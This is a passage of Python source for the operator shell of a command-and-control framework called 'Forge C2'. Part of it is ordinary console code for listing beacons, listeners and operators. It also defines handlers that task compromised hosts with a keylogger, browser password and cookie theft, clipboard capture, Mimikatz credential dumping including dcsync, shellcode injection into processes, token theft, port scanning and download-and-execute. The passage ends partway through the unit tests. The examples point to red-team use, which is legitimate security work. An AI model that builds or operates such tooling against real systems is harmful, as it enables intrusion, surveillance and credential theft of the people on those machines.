            self._print_error("Usage: kill <beacon_id>")
            return

        # Confirm
        try:
            confirm = input(
                f"  {C.RED}Kill beacon {C.BEACON_ID}{bid}{C.RED}? "
                f"This cannot be undone. [y/N]: {C.RESET}"
            )
        except (EOFError, KeyboardInterrupt):
            print()
            return

        if confirm.lower() not in ("y", "yes"):
            self._print_info("Cancelled.")
            return

        resp = await self.transport.send({"cmd": "kill", "beacon_id": bid})
        if resp.get("status") == "ok":
            self._print_success(
                f"Kill command sent to beacon {C.BEACON_ID}{bid}{C.RESET}"
            )
            if self._active_beacon == bid:
                self._active_beacon = None
                self._active_beacon_hostname = ""
        else:
            self._print_error(resp.get("message", "Kill failed"))

    async def _cmd_info(self, args: list[str]) -> None:
        """Show detailed beacon info."""
        if args:
            bid = self._match_beacon_id(args[0])
        elif self._active_beacon:
            bid = self._active_beacon
        else:
            self._print_error("Usage: info <beacon_id>")
            return

        if not bid:
            self._print_error(f"Beacon '{args[0] if args else ''}' not found")
            return

        resp = await self.transport.send({"cmd": "beacon_info", "beacon_id": bid})
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "Beacon not found"))
            return

        data = resp.get("data", {})
        meta = data.get("metadata", {})

        print()
        print(f"  {C.BOLD}{C.ACCENT}═══ Beacon {C.BEACON_ID}{bid}{C.ACCENT} ═══{C.RESET}")
        print()

        rows = [
            ("Hostname",       meta.get("hostname", "???")),
            ("Username",       meta.get("username", "???")),
            ("Domain",         meta.get("domain", "") or "—"),
            ("OS",             f"{meta.get('os_version', '')} ({meta.get('os_arch', '')})"),
            ("Process",        f"{meta.get('process_name', '')} (PID: {meta.get('pid', '')})"),
            ("Integrity",      meta.get("integrity", "") or "—"),
            ("Admin",          "✅ Yes" if meta.get("is_admin") else "❌ No"),
            ("Domain Joined",  "✅ Yes" if meta.get("is_domain") else "❌ No"),
            ("Internal IP",    meta.get("internal_ip", "") or "—"),
            ("External IP",    meta.get("external_ip", "") or "—"),
            ("Transport",      data.get("transport", "???")),
            ("State",          data.get("state", "???")),
            ("Sleep",          f"{data.get('sleep_seconds', 60)}s / {data.get('jitter_pct', 0)}% jitter"),
            ("Last Check-in",  f"{data.get('time_since_checkin', 0):.1f}s ago"),
            ("Check-ins",      str(data.get("checkin_count", 0))),
            ("Pending Tasks",  str(data.get("pending_tasks", 0))),
            ("Completed Tasks",str(data.get("completed_tasks", 0))),
            ("AV Products",    ", ".join(meta.get("av_products", [])) or "None detected"),
            ("Interfaces",     ", ".join(meta.get("interfaces", [])) or "—"),
            ("Parent Beacon",  data.get("parent_beacon") or "None (initial)"),
            ("Child Beacons",  ", ".join(data.get("child_beacons", [])) or "None"),
        ]

        for label, value in rows:
            print(f"    {C.CYAN}{label + ':':<20}{C.RESET} {value}")

        print()

    async def _cmd_note(self, args: list[str]) -> None:
        """Add a local note to a beacon (kept in operator console only)."""
        # Notes are local-only — useful for operator workflow
        if not args:
            self._print_error("Usage: note [beacon_id] <text>")
            return

        if self._active_beacon:
            text = " ".join(args)
            bid = self._active_beacon
        elif len(args) >= 2:
            bid = self._match_beacon_id(args[0])
            text = " ".join(args[1:])
            if not bid:
                self._print_error(f"Beacon '{args[0]}' not found")
                return
        else:
            self._print_error("Usage: note <beacon_id> <text>")
            return

        # Just print locally — notes don't go to the server
        timestamp = time.strftime("%H:%M:%S")
        self._print_info(
            f"📝 [{timestamp}] Note on {C.BEACON_ID}{bid}{C.RESET}"
            f"{C.INFO}: {text}"
        )

    async def _cmd_listeners(self, args: list[str]) -> None:
        """List all listeners."""
        resp = await self.transport.send({"cmd": "listeners"})
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "Failed"))
            return

        data = resp.get("data", {})
        listeners = data.get("listeners", [])

        if not listeners:
            self._print_warning("No listeners configured. Use 'listener_create' to add one.")
            return

        # Cache
        self._listener_ids = [l["listener_id"] for l in listeners]

        print()
        headers = ["ID", "NAME", "TYPE", "BIND", "STATE", "CONNS", "BEACONS"]
        col_w =   [10,   20,     8,      22,     10,      8,       8]

        header_line = ""
        for h, w in zip(headers, col_w):
            header_line += f"{C.HEADER}{C.BOLD}{h:<{w}}{C.RESET}"
        print(f"  {header_line}")
        print(f"  {C.DIM}{'─' * sum(col_w)}{C.RESET}")

        for l in listeners:
            state = l.get("state", "stopped")
            state_color = C.GREEN if state == "running" else C.RED if state == "error" else C.YELLOW

            row = (
                f"  {C.WHITE}{l['listener_id']:<10}{C.RESET}"
                f"{l.get('name', ''):<20}"
                f"{l.get('type', ''):<8}"
                f"{l.get('bind', ''):<22}"
                f"{state_color}{state:<10}{C.RESET}"
                f"{l.get('connections', 0):<8}"
                f"{l.get('beacons_staged', 0):<8}"
            )
            print(row)
        print()

    async def _cmd_listener_create(self, args: list[str]) -> None:
        """Create a new listener (interactive)."""
        try:
            print()
            print(f"  {C.BOLD}{C.ACCENT}── Create Listener ──{C.RESET}")
            print()

            ltype = input(
                f"    {C.CYAN}Type (https/http/tcp/dns/smb){C.RESET} "
                f"[{C.DIM}https{C.RESET}]: "
            ).strip() or "https"

            host = input(
                f"    {C.CYAN}Bind host{C.RESET} "
                f"[{C.DIM}0.0.0.0{C.RESET}]: "
            ).strip() or "0.0.0.0"

            default_port = {"https": 443, "http": 80, "tcp": 4444,
                           "dns": 53, "smb": 445}.get(ltype, 443)
            port_str = input(
                f"    {C.CYAN}Bind port{C.RESET} "
                f"[{C.DIM}{default_port}{C.RESET}]: "
            ).strip()
            port = int(port_str) if port_str else default_port

        except (EOFError, KeyboardInterrupt, ValueError):
            print()
            self._print_info("Cancelled.")
            return

        resp = await self.transport.send({
            "cmd": "listener_create",
            "type": ltype,
            "host": host,
            "port": port,
        })

        if resp.get("status") == "ok":
            lid = resp.get("listener_id", "")
            self._print_success(
                f"Listener created: {C.WHITE}{lid}{C.RESET}"
                f"{C.SUCCESS} ({ltype} on {host}:{port})"
            )
            self._print_info(f"Start it with: listener_start {lid}")
        else:
            self._print_error(resp.get("message", "Listener creation failed"))

    async def _cmd_listener_start(self, args: list[str]) -> None:
        """Start a listener."""
        if not args:
            self._print_error("Usage: listener_start <listener_id>")
            return

        resp = await self.transport.send({
            "cmd": "listener_start",
            "listener_id": args[0],
        })
        if resp.get("status") == "ok":
            self._print_success(f"Listener {args[0]} started.")
        else:
            self._print_error(resp.get("message", "Start failed"))

    async def _cmd_listener_stop(self, args: list[str]) -> None:
        """Stop a listener."""
        if not args:
            self._print_error("Usage: listener_stop <listener_id>")
            return

        resp = await self.transport.send({
            "cmd": "listener_stop",
            "listener_id": args[0],
        })
        if resp.get("status") == "ok":
            self._print_success(f"Listener {args[0]} stopped.")
        else:
            self._print_error(resp.get("message", "Stop failed"))

    async def _cmd_operators(self, args: list[str]) -> None:
        """List connected operators."""
        resp = await self.transport.send({"cmd": "operators"})
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "Failed"))
            return

        data = resp.get("data", {})
        ops = data.get("operators", [])

        print()
        headers = ["USERNAME", "ROLE", "IP", "ACTIVE", "LAST ACTIVE"]
        col_w =   [16,        12,     18,   10,       20]

        header_line = ""
        for h, w in zip(headers, col_w):
            header_line += f"{C.HEADER}{C.BOLD}{h:<{w}}{C.RESET}"
        print(f"  {header_line}")
        print(f"  {C.DIM}{'─' * sum(col_w)}{C.RESET}")

        for op in ops:
            active = op.get("active", False)
            active_str = f"{C.GREEN}● Online{C.RESET}" if active else f"{C.DIM}○ Offline{C.RESET}"

            last_active = op.get("last_active", 0)
            if last_active:
                la_str = time.strftime("%Y-%m-%d %H:%M:%S",
                                       time.localtime(last_active))
            else:
                la_str = "Never"

            role_color = C.RED if op.get("role") == "admin" else C.YELLOW if op.get("role") == "operator" else C.DIM

            row = (
                f"  {C.WHITE}{op.get('username', ''):<16}{C.RESET}"
                f"{role_color}{op.get('role', ''):<12}{C.RESET}"
                f"{op.get('ip_address', ''):<18}"
                f"{active_str:<{10 + 12}}"   # extra for ANSI codes
                f"{la_str:<20}"
            )
            print(row)

        print()
        print(
            f"  {C.DIM}Total: {data.get('total', 0)} │ "
            f"Active: {data.get('active', 0)}{C.RESET}"
        )
        print()

    async def _cmd_status(self, args: list[str]) -> None:
        """Show team server status."""
        resp = await self.transport.send({"cmd": "status"})
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "Failed"))
            return

        data = resp.get("data", {})

        uptime_s = data.get("uptime_seconds", 0)
        if uptime_s < 60:
            uptime_str = f"{uptime_s:.0f}s"
        elif uptime_s < 3600:
            uptime_str = f"{uptime_s / 60:.1f}m"
        else:
            uptime_str = f"{uptime_s / 3600:.1f}h"

        beacons = data.get("beacons", {})
        listeners = data.get("listeners", {})
        operators = data.get("operators", {})

        print()
        print(f"  {C.BOLD}{C.ACCENT}═══ Team Server Status ═══{C.RESET}")
        print()
        print(f"    {C.CYAN}Server:{C.RESET}      {self.host}:{self.port}")
        print(f"    {C.CYAN}Uptime:{C.RESET}      {uptime_str}")
        print(f"    {C.CYAN}Running:{C.RESET}     {'✅ Yes' if data.get('running') else '❌ No'}")
        print()
        print(f"    {C.CYAN}Beacons:{C.RESET}     {beacons.get('total', 0)} total, "
              f"{C.GREEN}{beacons.get('states', {}).get('active', 0)} active{C.RESET}")
        print(f"    {C.CYAN}Listeners:{C.RESET}   {listeners.get('total', 0)} total, "
              f"{C.GREEN}{listeners.get('running', 0)} running{C.RESET}")
        print(f"    {C.CYAN}Operators:{C.RESET}   {operators.get('total', 0)} total, "
              f"{C.GREEN}{operators.get('active', 0)} active{C.RESET}")
        print(f"    {C.CYAN}Tasks:{C.RESET}       {data.get('tasks_total', 0)} total")
        print()

    async def _cmd_task_history(self, args: list[str]) -> None:
        """Show recent task history."""
        resp = await self.transport.send({"cmd": "task_history"})
        if resp.get("status") != "ok":
            self._print_error(resp.get("message", "Failed"))
            return

        entries = resp.get("data", [])
        if not entries:
            self._print_warning("No task history.")
            return

        # Show last 20
        entries = entries[-20:]

        print()
        print(f"  {C.BOLD}{C.ACCENT}═══ Task History (last {len(entries)}) ═══{C.RESET}")
        print()

        for e in entries:
            ts = e.get("timestamp", "")[:19]
            op = e.get("operator", "???")
            bid = e.get("beacon_id", "???")
            hostname = e.get("hostname", "")
            command = e.get("command", "???")
            task_id = e.get("task_id", "")
            args_str = json.dumps(e.get("args", {})) if e.get("args") else ""

            print(
                f"  {C.DIM}{ts}{C.RESET} "
                f"{C.YELLOW}[{op}]{C.RESET} → "
                f"{C.BEACON_ID}{bid}{C.RESET}"
                f"{C.DIM}{'/' + hostname if hostname else ''}{C.RESET}: "
                f"{C.GREEN}{command}{C.RESET}"
                f"{C.DIM}{' ' + args_str if args_str else ''}{C.RESET}"
            )

        print()

    async def _cmd_task_all(self, args: list[str]) -> None:
        """Send a command to ALL active beacons."""
        if not args:
            self._print_error("Usage: task_all <command> [args...]")
            return

        task_cmd = args[0]
        task_args = {}
        if len(args) > 1:
            task_args["cmd"] = " ".join(args[1:])

        resp = await self.transport.send({
            "cmd": "task_all",
            "task_cmd": task_cmd,
            "args": task_args,
        })

        if resp.get("status") == "ok":
            count = resp.get("tasks_queued", 0)
            self._print_success(
                f"Task '{task_cmd}' queued for {count} active beacon(s)"
            )
        else:
            self._print_error(resp.get("message", "Failed"))

    async def _cmd_add_operator(self, args: list[str]) -> None:
        """Add a new operator (admin only)."""
        try:
            if len(args) >= 2:
                username = args[0]
                password = args[1]
                role = args[2] if len(args) > 2 else "operator"
            else:
                username = input(f"    {C.CYAN}Username:{C.RESET} ").strip()
                password = getpass.getpass(f"    {C.CYAN}Password:{C.RESET} ")
                role = input(
                    f"    {C.CYAN}Role (admin/operator/viewer){C.RESET} "
                    f"[{C.DIM}operator{C.RESET}]: "
                ).strip() or "operator"
        except (EOFError, KeyboardInterrupt):
            print()
            self._print_info("Cancelled.")
            return

        resp = await self.transport.send({
            "cmd": "add_operator",
            "username": username,
            "password": password,
            "role": role,
        })

        if resp.get("status") == "ok":
            self._print_success(f"Operator '{username}' added (role: {role})")
        else:
            self._print_error(resp.get("message", "Failed"))

    # ══════════════════════════════════════════════════════════════
    #  SPRINT 3: C2 TASK EXPANSION COMMANDS
    # ══════════════════════════════════════════════════════════════

    async def _cmd_execute_assembly(self, args: list[str]) -> None:
        """Execute a .NET assembly in-memory (execute-assembly).

        Usage:
            execute-assembly <path> [args...]
            execute-assembly Seatbelt.exe -group=all -full
            execute-assembly Rubeus.exe kerberoast
        """
        bid = self._require_beacon()
        if not bid:
            return
        if not args:
            self._print_error("Usage: execute-assembly <path|b64> [args...]")
            return

        path = args[0]
        asm_args = args[1:]

        self._print_info(f"⚙ execute-assembly: {path} {' '.join(asm_args)}")
        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "execute_assembly",
            "args": {"path": path, "arguments": asm_args},
        })
        self._print_task_result(resp, f"execute-assembly: {path}")

    async def _cmd_keylogger(self, args: list[str]) -> None:
        """Keyboard capture — start/stop/dump.

        Usage:
            keylogger start [duration_seconds]
            keylogger stop
            keylogger dump
        """
        bid = self._require_beacon()
        if not bid:
            return

        action = args[0] if args else "start"
        duration = int(args[1]) if len(args) > 1 else 600

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "keylogger",
            "args": {"action": action, "duration": duration},
        })
        self._print_task_result(resp, f"keylogger {action}")

    async def _cmd_browser_creds(self, args: list[str]) -> None:
        """Extract saved browser passwords and cookies.

        Usage:
            creds                    — extract all
            creds chrome             — Chrome only
            creds firefox passwords  — Firefox passwords only
        """
        bid = self._require_beacon()
        if not bid:
            return

        browsers = [args[0]] if args else ["all"]
        extract = args[1] if len(args) > 1 else "all"

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "browser_creds",
            "args": {"browsers": browsers, "extract": extract},
        })
        self._print_task_result(resp, "browser_creds")

    async def _cmd_clipboard(self, args: list[str]) -> None:
        """Clipboard monitoring — start/stop/dump.

        Usage:
            clipboard start [interval_seconds]
            clipboard stop
            clipboard dump
        """
        bid = self._require_beacon()
        if not bid:
            return

        action = args[0] if args else "start"
        interval = float(args[1]) if len(args) > 1 else 2.0

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "clipboard",
            "args": {"action": action, "interval": interval},
        })
        self._print_task_result(resp, f"clipboard {action}")

    async def _cmd_mimikatz(self, args: list[str]) -> None:
        """In-memory Mimikatz execution.

        Usage:
            mimikatz logonpasswords
            mimikatz sam
            mimikatz dcsync DOMAIN\\user
            mimikatz tickets
            mimi wdigest
        """
        bid = self._require_beacon()
        if not bid:
            return

        command = args[0] if args else "logonpasswords"
        target = args[1] if len(args) > 1 else ""

        self._print_info(f"⚠ CRITICAL: Mimikatz {command} — confirm in beacon")
        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "mimikatz",
            "args": {"command": command, "target": target},
        })
        self._print_task_result(resp, f"mimikatz {command}")

    async def _cmd_registry(self, args: list[str]) -> None:
        """Windows registry operations.

        Usage:
            reg query HKLM\\SOFTWARE\\Microsoft
            reg read HKLM\\SOFTWARE\\Microsoft ValueName
            reg write HKLM\\SOFTWARE\\Test Name Data REG_SZ
            reg delete HKLM\\SOFTWARE\\Test Name
            reg search HKLM\\SOFTWARE pattern
        """
        bid = self._require_beacon()
        if not bid:
            return
        if not args:
            self._print_error("Usage: reg <query|read|write|delete|search> <key_path> [args]")
            return

        operation = args[0]
        key_path = args[1] if len(args) > 1 else ""
        task_args: dict[str, Any] = {"operation": operation, "key_path": key_path}

        if operation == "read" and len(args) > 2:
            task_args["value_name"] = args[2]
        elif operation == "write" and len(args) > 3:
            task_args["value_name"] = args[2]
            task_args["value_data"] = args[3]
            if len(args) > 4:
                task_args["value_type"] = args[4]
        elif operation == "delete" and len(args) > 2:
            task_args["value_name"] = args[2]
        elif operation == "search" and len(args) > 2:
            task_args["search_pattern"] = args[2]

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "registry",
            "args": task_args,
        })
        self._print_task_result(resp, f"registry {operation}")

    async def _cmd_service(self, args: list[str]) -> None:
        """Windows service management.

        Usage:
            sc query [service_name]
            sc create ServiceName DisplayName C:\\path\\binary.exe
            sc start ServiceName
            sc stop ServiceName
            sc delete ServiceName
        """
        bid = self._require_beacon()
        if not bid:
            return
        if not args:
            self._print_error("Usage: sc <query|create|start|stop|delete> [service_name] [args]")
            return

        operation = args[0]
        service_name = args[1] if len(args) > 1 else ""
        task_args: dict[str, Any] = {
            "operation": operation,
            "service_name": service_name,
        }

        if operation == "create" and len(args) > 3:
            task_args["display_name"] = args[2]
            task_args["binary_path"] = args[3]

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "service",
            "args": task_args,
        })
        self._print_task_result(resp, f"service {operation}")

    async def _cmd_wmi(self, args: list[str]) -> None:
        """WMI query and execution.

        Usage:
            wmi processes                    — query process list
            wmi services                     — query services
            wmi users                        — query user accounts
            wmi "SELECT * FROM Win32_Share"  — custom WQL query
            wmi exec <command> [target]      — execute via WMI
        """
        bid = self._require_beacon()
        if not bid:
            return

        if not args:
            # Show shortcuts
            resp = await self.transport.send({
                "cmd": "task",
                "beacon_id": bid,
                "task_cmd": "wmi",
                "args": {"operation": "query"},
            })
            self._print_task_result(resp, "wmi")
            return

        if args[0] == "exec":
            command = " ".join(args[1:])
            resp = await self.transport.send({
                "cmd": "task",
                "beacon_id": bid,
                "task_cmd": "wmi",
                "args": {"operation": "exec", "command": command},
            })
        else:
            query = " ".join(args)
            resp = await self.transport.send({
                "cmd": "task",
                "beacon_id": bid,
                "task_cmd": "wmi",
                "args": {"operation": "query", "query": query},
            })

        self._print_task_result(resp, f"wmi {args[0]}")

    async def _cmd_inject(self, args: list[str]) -> None:
        """Process injection — shellcode into target PID.

        Usage:
            inject <pid> <shellcode_path> [technique]
            inject 1234 /tmp/payload.bin crt
            inject 1234 /tmp/payload.bin apc
            inject --list                    — list techniques

        Techniques: crt, apc, hollow, section, stomp, hijack
        """
        bid = self._require_beacon()
        if not bid:
            return

        if not args or args[0] == "--list":
            resp = await self.transport.send({
                "cmd": "task",
                "beacon_id": bid,
                "task_cmd": "inject",
                "args": {"list_techniques": True},
            })
            self._print_task_result(resp, "inject techniques")
            return

        if len(args) < 2:
            self._print_error("Usage: inject <pid> <shellcode_path> [technique]")
            return

        pid = int(args[0])
        sc_path = args[1]
        technique = args[2] if len(args) > 2 else "crt"

        self._print_info(f"⚠ CRITICAL: Injecting into PID {pid} via {technique}")
        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "inject",
            "args": {"pid": pid, "shellcode_path": sc_path, "technique": technique},
        })
        self._print_task_result(resp, f"inject PID {pid}")

    async def _cmd_token(self, args: list[str]) -> None:
        """Token manipulation.

        Usage:
            token list                — list available tokens
            token steal <pid>         — steal token from PID
            token whoami              — show current identity
            token elevate             — attempt SYSTEM elevation
        """
        bid = self._require_beacon()
        if not bid:
            return

        action = args[0] if args else "whoami"
        task_args: dict[str, Any] = {"action": action}

        if action == "steal" and len(args) > 1:
            task_args["pid"] = int(args[1])

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "token",
            "args": task_args,
        })
        self._print_task_result(resp, f"token {action}")

    async def _cmd_rev2self(self, args: list[str]) -> None:
        """Revert to original token (shortcut for 'token rev2self')."""
        bid = self._require_beacon()
        if not bid:
            return

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "token",
            "args": {"action": "rev2self"},
        })
        self._print_task_result(resp, "rev2self")

    async def _cmd_make_token(self, args: list[str]) -> None:
        """Create token with credentials (shortcut for 'token make_token').

        Usage:
            make_token DOMAIN\\user password
        """
        bid = self._require_beacon()
        if not bid:
            return
        if len(args) < 2:
            self._print_error("Usage: make_token <DOMAIN\\user> <password>")
            return

        user_spec = args[0]
        password = args[1]
        domain = "."
        username = user_spec
        if "\\" in user_spec:
            domain, username = user_spec.split("\\", 1)

        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "token",
            "args": {
                "action": "make_token",
                "username": username,
                "password": password,
                "domain": domain,
            },
        })
        self._print_task_result(resp, f"make_token {domain}\\{username}")

    async def _cmd_portscan(self, args: list[str]) -> None:
        """Beacon-side TCP port scan.

        Usage:
            portscan 10.0.0.1 top20
            portscan 10.0.0.0/24 445,3389
            portscan 10.0.0.1-10 web
            scan 192.168.1.0/24 windows
        """
        bid = self._require_beacon()
        if not bid:
            return
        if not args:
            self._print_error(
                "Usage: portscan <target> [ports]\n"
                "  Presets: top20, top100, web, windows, database, smb, rdp"
            )
            return

        targets = args[0]
        ports = args[1] if len(args) > 1 else "top20"

        self._print_info(f"Scanning {targets} ports={ports}...")
        resp = await self.transport.send({
            "cmd": "task",
            "beacon_id": bid,
            "task_cmd": "portscan",
            "args": {"targets": targets, "ports": ports},
        })
        self._print_task_result(resp, f"portscan {targets}")

    async def _cmd_download_exec(self, args: list[str]) -> None:
        """Download and execute a file from C2.

        Usage:
            dlexec <local_file> [args...]
            download_exec payload.exe --mode memory
        """
        bid = self._require_beacon()
        if not bid:
            return
        if not args:
            self._print_error("Usage: dlexec <file_path> [arguments...]")
            return

        file_path = args[0]
        exec_args = args[1:]
        mode = "direct"

        # Check for --mode flag
        for i, a in enumerate(exec_args):
            if a == "--mode" and i + 1 < len(exec_args):
                mode = exec_args[i + 1]
                exec_args = exec_args[:i] + exec_args[i + 2:]
                break

        # Read local file and base64 encode
        if os.path.exists(file_path):
            import base64 as _b64
            with open(file_path, "rb") as f:
                b64_data = _b64.b64encode(f.read()).decode()
            resp = await self.transport.send({
                "cmd": "task",
                "beacon_id": bid,
                "task_cmd": "download_exec",
                "args": {
                    "data": b64_data,
                    "filename": os.path.basename(file_path),
                    "arguments": exec_args,
                    "mode": mode,
                },
            })
        else:
            # Assume it's a filename on the C2 server / URL
            resp = await self.transport.send({
                "cmd": "task",
                "beacon_id": bid,
                "task_cmd": "download_exec",
                "args": {
                    "url": file_path,
                    "arguments": exec_args,
                    "mode": mode,
                },
            })

        self._print_task_result(resp, f"download_exec {file_path}")

    # ══════════════════════════════════════════════════════════════
    #  GENERAL COMMANDS (continued)
    # ══════════════════════════════════════════════════════════════

    async def _cmd_clear(self, args: list[str]) -> None:
        """Clear the terminal."""
        os.system("cls" if sys.platform == "win32" else "clear")

    async def _cmd_exit(self, args: list[str]) -> None:
        """Exit the operator shell."""
        self._running = False
        self._print_info("Goodbye, operator. Stay sharp. 🔥")

    # ══════════════════════════════════════════════════════════════
    #  HELPERS
    # ══════════════════════════════════════════════════════════════

    def _require_beacon(self) -> str | None:
        """Ensure we're in beacon interaction mode, return the beacon ID."""
        if not self._active_beacon:
            self._print_error(
                "No active beacon. Use 'interact <id>' first, "
                "or 'beacons' to list."
            )
            return None
        return self._active_beacon

    def _match_beacon_id(self, partial: str) -> str | None:
        """Match a partial beacon ID from the cache.

        Supports full ID or prefix match.
        """
        if partial in self._beacon_ids:
            return partial

        # Prefix match
        matches = [bid for bid in self._beacon_ids if bid.startswith(partial)]
        if len(matches) == 1:
            return matches[0]
        elif len(matches) > 1:
            self._print_warning(
                f"Ambiguous beacon ID '{partial}': "
                + ", ".join(matches[:5])
            )
            return None
        return None

    def _print_task_result(self, resp: dict[str, Any], label: str) -> None:
        """Print task queue confirmation."""
        if resp.get("status") == "ok":
            task_id = resp.get("task_id", "???")
            self._print_success(
                f"Task queued: {C.DIM}[{task_id}]{C.RESET}"
                f"{C.SUCCESS} {label}"
            )
        else:
            self._print_error(resp.get("message", "Task failed"))

    async def _refresh_beacon_cache(self) -> None:
        """Refresh the beacon ID cache for tab completion."""
        try:
            resp = await self.transport.send({"cmd": "beacons"})
            if resp.get("status") == "ok":
                beacons = resp.get("data", {}).get("beacons", [])
                self._beacon_ids = [b["beacon_id"] for b in beacons]
        except Exception:
            pass

    async def _refresh_listener_cache(self) -> None:
        """Refresh the listener ID cache."""
        try:
            resp = await self.transport.send({"cmd": "listeners"})
            if resp.get("status") == "ok":
                listeners = resp.get("data", {}).get("listeners", [])
                self._listener_ids = [l["listener_id"] for l in listeners]
        except Exception:
            pass

    # ── History persistence ────────────────────────────────────────

    def _load_history(self) -> None:
        """Load command history from file."""
        if self._history_file.exists():
            try:
                lines = self._history_file.read_text(encoding="utf-8").splitlines()
                self._history = lines[-500:]
            except Exception:
                pass

        # Also set up readline if available
        try:
            import readline
            readline.set_history_length(500)
            for line in self._history:
                readline.add_history(line)
            # Tab completion
            readline.set_completer(self._completer)
            readline.parse_and_bind("tab: complete")
        except ImportError:
            # Windows without pyreadline3 — that's fine
            pass

    def _save_history(self) -> None:
        """Save command history to file."""
        try:
            self._history_file.write_text(
                "\n".join(self._history[-500:]),
                encoding="utf-8",
            )
        except Exception:
            pass

    def _completer(self, text: str, state: int) -> str | None:
        """Tab completion for readline."""
        if state == 0:
            all_commands = list(self._get_handler_map().keys())
            # Add beacon and listener IDs
            all_commands.extend(self._beacon_ids)
            all_commands.extend(self._listener_ids)

            if text:
                self._completion_matches = [
                    c for c in all_commands if c.startswith(text)
                ]
            else:
                self._completion_matches = all_commands

        try:
            return self._completion_matches[state]
        except IndexError:
            return None

    def _get_handler_map(self) -> dict[str, Any]:
        """Get all command names (for completion)."""
        return {
            "help": None, "beacons": None, "interact": None,
            "back": None, "shell": None, "bof": None, "bofs": None,
            "profiles": None, "download": None,
            "upload": None, "screenshot": None, "hashdump": None,
            "socks": None, "link": None, "unlink": None, "p2p_tree": None,
            "relay_tree": None, "sleep": None, "kill": None, "info": None,
            "note": None, "listeners": None, "listener_create": None,
            "listener_start": None, "listener_stop": None,
            "operators": None, "status": None, "history": None,
            "task_all": None, "add_operator": None, "clear": None,
            "exit": None, "quit": None,
        }

    # ── Output helpers ─────────────────────────────────────────────

    @staticmethod
    def _print_success(msg: str) -> None:
        print(f"  {C.SUCCESS}[+]{C.RESET} {msg}")

    @staticmethod
    def _print_error(msg: str) -> None:
        print(f"  {C.ERROR}[-]{C.RESET} {msg}")

    @staticmethod
    def _print_warning(msg: str) -> None:
        print(f"  {C.WARNING}[!]{C.RESET} {msg}")

    @staticmethod
    def _print_info(msg: str) -> None:
        print(f"  {C.INFO}[*]{C.RESET} {msg}")


# ══════════════════════════════════════════════════════════════════════
#  CLI ENTRY POINT
# ══════════════════════════════════════════════════════════════════════

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Forge C2 Operator Shell — connect to a team server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --server 127.0.0.1 --port 50050
  %(prog)s --server team.redteam.local --port 50050
  %(prog)s -s 10.0.0.5 -p 50050
        """,
    )
    parser.add_argument(
        "-s", "--server", default="127.0.0.1",
        help="Team server IP/hostname (default: 127.0.0.1)",
    )
    parser.add_argument(
        "-p", "--port", type=int, default=50050,
        help="Team server operator port (default: 50050)",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Enable verbose logging",
    )
    return parser.parse_args()


async def main() -> None:
    """Async entry point."""
    args = parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.WARNING)

    shell = OperatorShell(host=args.server, port=args.port)
    await shell.run()


def entry_point() -> None:
    """Sync entry point — handles the event loop."""
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n  {C.INFO}[*]{C.RESET} Interrupted. Goodbye.")


# ══════════════════════════════════════════════════════════════════════
#  TESTS
# ══════════════════════════════════════════════════════════════════════

class TestCommandParsing:
    """Unit tests for command parsing."""

    def test_simple_parse(self) -> None:
        tokens = OperatorShell._parse_command("shell whoami")
        assert tokens == ["shell", "whoami"]

    def test_quoted_parse(self) -> None:
        tokens = OperatorShell._parse_command('shell "net user /domain"')
        assert tokens == ["shell", "net user /domain"]

    def test_empty_parse(self) -> None:
        tokens = OperatorShell._parse_command("")
        assert tokens == []

    def test_single_command(self) -> None:
        tokens = OperatorShell._parse_command("beacons")
        assert tokens == ["beacons"]


class TestBeaconMatching:
    """Unit tests for beacon ID matching."""

    def test_exact_match(self) -> None:
        shell = OperatorShell()
        shell._beacon_ids = ["abc12345", "def67890"]
        assert shell._match_beacon_id("abc12345") == "abc12345"

    def test_prefix_match(self) -> None:
        shell = OperatorShell()
        shell._beacon_ids = ["abc12345", "def67890"]
        assert shell._match_beacon_id("abc") == "abc12345"

    def test_no_match(self) -> None:
        shell = OperatorShell()
        shell._beacon_ids = ["abc12345"]
        assert shell._match_beacon_id("zzz") is None

    def test_ambiguous_match(self) -> None:
        shell = OperatorShell()
        shell._beacon_ids = ["abc12345", "abc67890"]
        assert shell._match_beacon_id("abc") is None


class TestColorSupport:
    """Test ANSI color class."""

    def test_color_constants_exist(self) -> None:
        assert hasattr(C, "RED")
        assert hasattr(C, "GREEN")
        assert hasattr(C, "PROMPT")
        assert hasattr(C, "RESET")


class _FakeTransport:
    def __init__(self) -> None:
        self.sent: list[dict[str, Any]] = []

    async def send(self, data: dict[str, Any]) -> dict[str, Any]:
        self.sent.append(data)
        if data["cmd"] == "p2p_tree":
            return {
                "status": "ok",
                "data": {
                    "nodes": [
                        {
                            "id": "parent1",
                            "hostname": "parent",
                            "parent": None,
                            "children": ["child1"],
                            "transport": "https",
                        },
                        {
                            "id": "child1",
                            "hostname": "child",
                            "parent": "parent1",
                            "children": [],
                            "transport": "p2p:tcp:emulated",
                        },
                    ],
                    "links": [{"parent": "parent1", "child": "child1"}],
                    "safety": "no peer listeners or relay sockets are created",
                },
            }
        if data["cmd"] == "p2p_link":
            return {
                "status": "ok",
                "data": {
